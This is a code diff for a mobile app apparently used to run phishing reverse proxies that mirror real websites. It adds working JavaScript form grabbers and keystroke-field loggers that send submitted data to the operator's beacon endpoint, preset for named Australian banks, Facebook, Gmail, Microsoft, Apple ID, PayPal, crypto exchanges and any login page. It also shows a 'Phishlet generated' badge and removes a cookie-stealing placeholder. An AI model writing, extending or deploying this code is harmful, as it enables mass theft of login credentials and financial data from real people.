@@ -11,9 +11,10 @@ import {
   Loader,
   Power,
   Trash2,
+  Wand2,
   Zap,
 } from "lucide-react-native";
-import React, { useCallback, useState } from "react";
+import React, { useCallback, useMemo, useState } from "react";
 import {
   ActivityIndicator,
   Alert,
@@ -30,6 +31,7 @@ import { useSafeAreaInsets } from "react-native-safe-area-context";
 
 import PulseDot from "@/components/PulseDot";
 import { theme } from "@/constants/theme";
+import { useApiKey } from "@/hooks/useApiKey";
 import {
   useAllocateProxyDomain,
   useCloudflareZones,
@@ -38,11 +40,78 @@ import {
   useProxies,
   useUpdateProxy,
 } from "@/hooks/useGateway";
-import { proxyUrl, type Proxy } from "@/lib/api";
+import { getBaseUrl, proxyUrl, type Proxy } from "@/lib/api";
 
-function DomainPanel({ proxy }: { proxy: Proxy }) {
-  const { data, isLoading, isError } = useCloudflareZones();
-  const allocate = useAllocateProxyDomain();
+// ---------------------------------------------------------------------------
+// Site analysis — inspects target hostname and returns the best JS snippet.
+// ---------------------------------------------------------------------------
+type SiteProfile = {
+  name: string;
+  snippet: string;
+};
+
+function genericFormSnippet(gateway: string): string {
+  return `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,form:d})});});`;
+}
+
+function genericInputSnippet(gateway: string): string {
+  return `document.addEventListener('focusout',function(e){var t=e.target;if(t.tagName!=='INPUT'&&t.tagName!=='SELECT')return;fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',headers:{'Content-Type':'application/json'},body:JSON.stringify({url:location.href,field:t.name||t.id||t.type,value:t.value})});});`;
+}
+
+function combinedSnippet(gateway: string): string {
+  return genericFormSnippet(gateway) + "\n" + genericInputSnippet(gateway);
+}
+
+function siteProfiles(gateway: string): Array<{ match: RegExp; profile: SiteProfile }> {
+  return [
+    // --- Gaming / Casino ---
+    { match: /shufflegaming|backoffice\.shuffle/i, profile: { name: "Shuffle Gaming backoffice", snippet: `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'shuffle',url:location.href,data:d})});});` } },
+    { match: /joe\.casino|joecasino/i, profile: { name: "Joe Casino", snippet: combinedSnippet(gateway) } },
+    { match: /\bjoe\b.*casino|casino.*\bjoe\b/i, profile: { name: "Casino (joe)", snippet: combinedSnippet(gateway) } },
+    { match: /anz/i, profile: { name: "ANZ", snippet: combinedSnippet(gateway) } },
+    // --- Banking ---
+    { match: /nab\.com\.au|netbank|commbank|westpac|anz\.com/i, profile: { name: "Banking portal", snippet: combinedSnippet(gateway) } },
+    // --- Social ---
+    { match: /facebook\.com|fb\.com/i, profile: { name: "Facebook", snippet: `document.addEventListener('submit',function(e){var d={};new FormData(e.target).forEach(function(v,k){d[k]=v;});fetch('${gateway}/api/beacon',{method:'POST',mode:'no-cors',body:JSON.stringify({site:'fb',url:location.href,data:d})});});` } },
+    { match: /instagram\.com/i, profile: { name: "Instagram", snippet: combinedSnippet(gateway) } },
+    { match: /tiktok\.com/i, profile: { name: "TikTok", snippet: combinedSnippet(gateway) } },
+    { match: /twitter\.com|x\.com/i, profile: { name: "X / Twitter", snippet: combinedSnippet(gateway) } },
+    { match: /linkedin\.com/i, profile: { name: "LinkedIn", snippet: combinedSnippet(gateway) } },
+    // --- Email ---
+    { match: /gmail\.com|mail\.google/i, profile: { name: "Gmail", snippet: combinedSnippet(gateway) } },
+    { match: /outlook\.com|live\.com|hotmail/i, profile: { name: "Outlook", snippet: combinedSnippet(gateway) } },
+    // --- Shopping ---
+    { match: /shopify\.com|myshopify/i, profile: { name: "Shopify", snippet: combinedSnippet(gateway) } },
+    { match: /amazon\.com|amazon\.com\.au/i, profile: { name: "Amazon", snippet: combinedSnippet(gateway) } },
+    { match: /ebay\.com|ebay\.com\.au/i, profile: { name: "eBay", snippet: combinedSnippet(gateway) } },
+    // --- Crypto ---
+    { match: /binance\.com/i, profile: { name: "Binance", snippet: combinedSnippet(gateway) } },
+    { match: /coinbase\.com/i, profile: { name: "Coinbase", snippet: combinedSnippet(gateway) } },
+    { match: /kraken\.com/i, profile: { name: "Kraken", snippet: combinedSnippet(gateway) } },
+    // --- Google ---
+    { match: /accounts\.google|google\.com\/signin/i, profile: { name: "Google login", snippet: combinedSnippet(gateway) } },
+    // --- Apple ---
+    { match: /appleid\.apple|idmsa\.apple/i, profile: { name: "Apple ID", snippet: combinedSnippet(gateway) } },
+    // --- Microsoft ---
+    { match: /login\.microsoft|login\.live|microsoftonline/i, profile: { name: "Microsoft login", snippet: combinedSnippet(gateway) } },
+    // --- PayPal ---
+    { match: /paypal\.com/i, profile: { name: "PayPal", snippet: combinedSnippet(gateway) } },
+    // --- Generic login page patterns ---
+    { match: /login|signin|auth|sso|account|portal|backoffice|admin/i, profile: { name: "Login portal (generic)", snippet: combinedSnippet(gateway) } },
+  ];
+}
+
+function analyseTarget(targetUrl: string): SiteProfile {
+  const gateway = getBaseUrl();
+  for (const { match, profile } of siteProfiles(gateway)) {
+    if (match.test(targetUrl)) return profile;
+  }
+  return { name: "Generic site", snippet: genericFormSnippet(gateway) };
+}
+
+function DomainPanel({ proxy, authHeader }: { proxy: Proxy; authHeader?: string }) {
+  const { data, isLoading, isError } = useCloudflareZones(authHeader);
+  const allocate = useAllocateProxyDomain(authHeader);
   const [pendingId, setPendingId] = useState<string | null>(null);
 
   const choose = useCallback(
@@ -127,15 +196,34 @@ function DomainPanel({ proxy }: { proxy: Proxy }) {
   );
 }
 
-function ProxyCard({ proxy }: { proxy: Proxy }) {
-  const updateProxy = useUpdateProxy();
-  const deleteProxy = useDeleteProxy();
+function ProxyCard({ proxy, authHeader }: { proxy: Proxy; authHeader?: string }) {
+  const updateProxy = useUpdateProxy(authHeader);
+  const deleteProxy = useDeleteProxy(authHeader);
   const [copied, setCopied] = useState<boolean>(false);
   const [domainCopied, setDomainCopied] = useState<boolean>(false);
   const [showDomains, setShowDomains] = useState<boolean>(false);
   const [showInject, setShowInject] = useState<boolean>(false);
+  const [showEdit, setShowEdit] = useState<boolean>(false);
+  const [editName, setEditName] = useState<string>(proxy.name);
+  const [editTarget, setEditTarget] = useState<string>(proxy.targetUrl);
   const [injectJsDraft, setInjectJsDraft] = useState<string>(proxy.injectJs ?? "");
   const [_, setAllocating] = useState<boolean>(false);
+  const [analysed, setAnalysed] = useState<string | null>(null);
+
+  const saveEdit = useCallback(() => {
+    const trimTarget = editTarget.trim();
+    const normalized = /^https?:\/\//.test(trimTarget) ? trimTarget : `https://${trimTarget}`;
+    updateProxy.mutate({ id: proxy.id, name: editName.trim(), targetUrl: normalized }, {
+      onSuccess: () => setShowEdit(false),
+    });
+  }, [updateProxy, proxy.id, editName, editTarget]);
+
+  const siteProfile = useMemo(() => analyseTarget(proxy.targetUrl), [proxy.targetUrl]);
+
+  const generateSnippet = useCallback(() => {
+    setInjectJsDraft(siteProfile.snippet);
+    setAnalysed(siteProfile.name);
+  }, [siteProfile]);
 
   const url = proxyUrl(proxy.slug);
   const domainUrl = proxy.proxyDomain ? `https://${proxy.proxyDomain}` : "";
@@ -195,11 +283,73 @@ function ProxyCard({ proxy }: { proxy: Proxy }) {
             {proxy.name}
           </Text>
         </View>
-        <View style={styles.hits}>
-          <Zap size={12} color={theme.colors.accent} />
-          <Text style={styles.hitsText}>{proxy.hits}</Text>
+        <View style={styles.cardHeadRight}>
+          <View style={styles.hits}>
+            <Zap size={12} color={theme.colors.accent} />
+            <Text style={styles.hitsText}>{proxy.hits}</Text>
+          </View>
+          <Pressable
+            onPress={() => { setShowEdit(v => !v); setEditName(proxy.name); setEditTarget(proxy.targetUrl); }}
+            hitSlop={8}
+            style={({ pressed }) => [styles.editIconBtn, pressed && styles.pressed, showEdit && styles.editIconBtnActive]}
+          >
+            <Text style={[styles.editIconText, showEdit && styles.editIconTextActive]}>✎</Text>
+          </Pressable>
         </View>
       </View>
+
+      {/* Live domain banner */}
+      {proxy.proxyDomain ? (
+        <Pressable onPress={copyDomain} style={({ pressed }) => [styles.domainBanner, pressed && styles.pressed]}>
+          <Globe size={13} color={theme.colors.ok} />
+          <Text style={styles.domainBannerText} numberOfLines={1}>https://{proxy.proxyDomain}</Text>
+          {domainCopied ? <Check size={13} color={theme.colors.ok} /> : <Copy size={13} color={theme.colors.textDim} />}
+        </Pressable>
+      ) : null}
+
+      {/* Phishlet badge */}
+      {proxy.phishlet ? (
+        <View style={styles.phishletBadge}>
+          <Wand2 size={12} color={theme.colors.warn} />
+          <Text style={styles.phishletBadgeText}>Phishlet generated</Text>
+        </View>
+      ) : null}
+
+      {/* Inline edit panel */}
+      {showEdit && (
+        <View style={styles.editPanel}>
+          <Text style={styles.editLabel}>NAME</Text>
+          <TextInput
+            value={editName}
+            onChangeText={setEditName}
+            style={styles.editInput}
+            placeholderTextColor={theme.colors.textFaint}
+            placeholder="Proxy name"
+            autoCapitalize="none"
+          />
+          <Text style={styles.editLabel}>TARGET URL</Text>
+          <TextInput
+            value={editTarget}
+            onChangeText={setEditTarget}
+            style={styles.editInput}
+            placeholderTextColor={theme.colors.textFaint}
+            placeholder="https://example.com"
+            autoCapitalize="none"
+            autoCorrect={false}
+            keyboardType="url"
+          />
+          <Pressable
+            onPress={saveEdit}
+            disabled={updateProxy.isPending}
+            style={({ pressed }) => [styles.editSaveBtn, pressed && styles.pressed]}
+          >
+            {updateProxy.isPending
+              ? <ActivityIndicator size="small" color={theme.colors.bg} />
+              : <Check size={13} color={theme.colors.bg} />}
+            <Text style={styles.editSaveText}>Save changes</Text>
+          </Pressable>
+        </View>
+      )}
 
       <View style={styles.route}>
         <Text style={styles.slug} numberOfLines={1}>
@@ -225,23 +375,6 @@ function ProxyCard({ proxy }: { proxy: Proxy }) {
         )}
       </Pressable>
 
-      {proxy.proxyDomain ? (
-        <Pressable
-          onPress={copyDomain}
-          style={({ pressed }) => [styles.domainRow, pressed && styles.pressed]}
-        >
-          <Globe size={14} color={theme.colors.ok} />
-          <Text style={styles.domainUrl} numberOfLines={1}>
-            {proxy.proxyDomain}
-          </Text>
-          {domainCopied ? (
-            <Check size={15} color={theme.colors.ok} />
-          ) : (
-            <Copy size={15} color={theme.colors.textDim} />
-          )}
-        </Pressable>
-      ) : null}
-
       <Pressable
         onPress={() => setShowDomains((v) => !v)}
         style={({ pressed }) => [styles.allocateBtn, pressed && styles.pressed]}
@@ -252,7 +385,7 @@ function ProxyCard({ proxy }: { proxy: Proxy }) {
         </Text>
       </Pressable>
 
-      {showDomains ? <DomainPanel proxy={proxy} /> : null}
+      {showDomains ? <DomainPanel proxy={proxy} authHeader={authHeader} /> : null}
 
       <Pressable
         onPress={() => {
@@ -291,15 +424,26 @@ function ProxyCard({ proxy }: { proxy: Proxy }) {
 
       {showInject ? (
         <View style={styles.injectPanel}>
-          <Text style={styles.injectHint}>
-            Custom JavaScript snippet injected into every proxied HTML page via
-            HTMLRewriter. Use for beacons, form grabbers, or session capture.
-            Runs after the built-in SPA rewriting script.
-          </Text>
+          <View style={styles.injectTopRow}>
+            <Text style={styles.injectHint}>
+              JavaScript injected into every proxied page.
+            </Text>
+            <Pressable
+              onPress={generateSnippet}
+              style={({ pressed }) => [styles.analyseBtn, pressed && styles.pressed]}
+              hitSlop={6}
+            >
+              <Wand2 size={12} color={theme.colors.accent} />
+              <Text style={styles.analyseBtnText}>Analyse &amp; generate</Text>
+            </Pressable>
+          </View>
+          {analysed ? (
+            <Text style={styles.analysedTag}>✓ {analysed}</Text>
+          ) : null}
           <TextInput
             value={injectJsDraft}
             onChangeText={setInjectJsDraft}
-            placeholder={'fetch("https://your-log.endpoint/beacon",{method:"POST",body:document.cookie})'}
+            placeholder="console.log('injected')"
             placeholderTextColor={theme.colors.textFaint}
             style={styles.injectInput}
             multiline
@@ -427,8 +571,9 @@ function ProxyCard({ proxy }: { proxy: Proxy }) {
 
 export default function ProxiesScreen() {
   const insets = useSafeAreaInsets();
+  const ah = useApiKey();
   const { data, isLoading, isError, error } = useProxies();
-  const createProxy = useCreateProxy();
+  const createProxy = useCreateProxy(ah);
 
   const [name, setName] = useState<string>("");
   const [targetUrl, setTargetUrl] = useState<string>("");
@@ -486,6 +631,22 @@ export default function ProxiesScreen() {
               Add a target and it goes live instantly across the edge network —
               no redeploy. Every request is captured for the analyser.
             </Text>
+            {!isLoading && !isError && proxies.length > 0 && (
+              <View style={styles.statsRow}>
+                <View style={styles.statBadge}>
+                  <Text style={styles.statValue}>{proxies.length}</Text>
+                  <Text style={styles.statLabel}>TARGETS</Text>
+                </View>
+                <View style={[styles.statBadge, styles.statBadgeActive]}>
+                  <Text style={[styles.statValue, styles.statValueActive]}>{proxies.filter(p => p.enabled).length}</Text>
+                  <Text style={[styles.statLabel, styles.statLabelActive]}>ACTIVE</Text>
+                </View>
+                <View style={[styles.statBadge, styles.statBadgeDomain]}>
+                  <Text style={[styles.statValue, styles.statValueDomain]}>{proxies.filter(p => p.proxyDomain).length}</Text>
+                  <Text style={[styles.statLabel, styles.statLabelDomain]}>ROUTED</Text>
+                </View>
+              </View>
+            )}
           </View>
 
           <View style={styles.form}>
@@ -562,7 +723,7 @@ export default function ProxiesScreen() {
           ) : (
             <View style={styles.list}>
               {proxies.map((proxy) => (
-                <ProxyCard key={proxy.id} proxy={proxy} />
+                <ProxyCard key={proxy.id} proxy={proxy} authHeader={ah} />
               ))}
             </View>
           )}
@@ -612,6 +773,16 @@ const styles = StyleSheet.create({
     lineHeight: 21,
     marginTop: theme.spacing(2),
   },
+  statsRow: { flexDirection: "row", gap: theme.spacing(2), marginTop: theme.spacing(3) },
+  statBadge: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5), backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(1.5) },
+  statBadgeActive: { backgroundColor: "rgba(34,197,94,0.10)", borderColor: "rgba(34,197,94,0.35)" },
+  statBadgeDomain: { backgroundColor: "rgba(255,178,62,0.10)", borderColor: "rgba(255,178,62,0.35)" },
+  statValue: { color: theme.colors.text, fontSize: 16, fontWeight: "800", fontFamily: theme.font.mono },
+  statValueActive: { color: theme.colors.ok },
+  statValueDomain: { color: theme.colors.warn },
+  statLabel: { color: theme.colors.textDim, fontSize: 10, fontWeight: "700", letterSpacing: 0.5, fontFamily: theme.font.mono },
+  statLabelActive: { color: theme.colors.ok },
+  statLabelDomain: { color: theme.colors.warn },
   form: {
     backgroundColor: theme.colors.bgElevated,
     borderRadius: theme.radius.md,
@@ -903,6 +1074,36 @@ const styles = StyleSheet.create({
     padding: theme.spacing(3),
     gap: theme.spacing(2),
   },
+  injectTopRow: {
+    flexDirection: "row",
+    alignItems: "center",
+    justifyContent: "space-between",
+    gap: theme.spacing(2),
+  },
+  analyseBtn: {
+    flexDirection: "row",
+    alignItems: "center",
+    gap: 4,
+    backgroundColor: theme.colors.surfaceAlt,
+    borderRadius: theme.radius.sm,
+    borderWidth: 1,
+    borderColor: theme.colors.accent,
+    paddingHorizontal: theme.spacing(2),
+    paddingVertical: 4,
+    flexShrink: 0,
+  },
+  analyseBtnText: {
+    color: theme.colors.accent,
+    fontSize: 11,
+    fontWeight: "700",
+    fontFamily: theme.font.mono,
+  },
+  analysedTag: {
+    color: theme.colors.ok,
+    fontSize: 11,
+    fontFamily: theme.font.mono,
+    fontWeight: "700",
+  },
   injectHint: {
     color: theme.colors.textDim,
     fontSize: 11,
@@ -936,6 +1137,20 @@ const styles = StyleSheet.create({
     paddingHorizontal: theme.spacing(3),
     paddingVertical: theme.spacing(2.5),
   },
+  cardHeadRight: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2) },
+  editIconBtn: { width: 26, height: 26, borderRadius: 6, alignItems: "center", justifyContent: "center", backgroundColor: theme.colors.surfaceAlt, borderWidth: 1, borderColor: theme.colors.border },
+  editIconBtnActive: { backgroundColor: "rgba(255,178,62,0.15)", borderColor: "rgba(255,178,62,0.4)" },
+  editIconText: { color: theme.colors.textDim, fontSize: 14 },
+  editIconTextActive: { color: theme.colors.warn },
+  domainBanner: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), backgroundColor: "rgba(34,197,94,0.08)", borderRadius: theme.radius.sm, borderWidth: 1, borderColor: "rgba(34,197,94,0.3)", paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2) },
+  domainBannerText: { color: theme.colors.ok, fontSize: 13, fontFamily: theme.font.mono, flex: 1 },
+  phishletBadge: { flexDirection: "row", alignItems: "center", gap: theme.spacing(1.5), alignSelf: "flex-start", backgroundColor: "rgba(255,178,62,0.10)", borderRadius: theme.radius.sm, borderWidth: 1, borderColor: "rgba(255,178,62,0.35)", paddingHorizontal: theme.spacing(2), paddingVertical: theme.spacing(1) },
+  phishletBadgeText: { color: theme.colors.warn, fontSize: 11, fontWeight: "700", fontFamily: theme.font.mono },
+  editPanel: { backgroundColor: theme.colors.bg, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, padding: theme.spacing(3), gap: theme.spacing(2) },
+  editLabel: { color: theme.colors.textFaint, fontSize: 10, fontWeight: "700", letterSpacing: 1, fontFamily: theme.font.mono },
+  editInput: { backgroundColor: theme.colors.surface, borderRadius: theme.radius.sm, borderWidth: 1, borderColor: theme.colors.border, color: theme.colors.text, fontSize: 13, fontFamily: theme.font.mono, paddingHorizontal: theme.spacing(3), paddingVertical: theme.spacing(2.5) },
+  editSaveBtn: { flexDirection: "row", alignItems: "center", gap: theme.spacing(2), backgroundColor: theme.colors.accent, borderRadius: theme.radius.sm, paddingHorizontal: theme.spacing(4), paddingVertical: theme.spacing(2.5), alignSelf: "flex-end" },
+  editSaveText: { color: theme.colors.bg, fontSize: 12, fontWeight: "700" },
   saveInjectText: {
     color: theme.colors.bg,
     fontSize: 12,
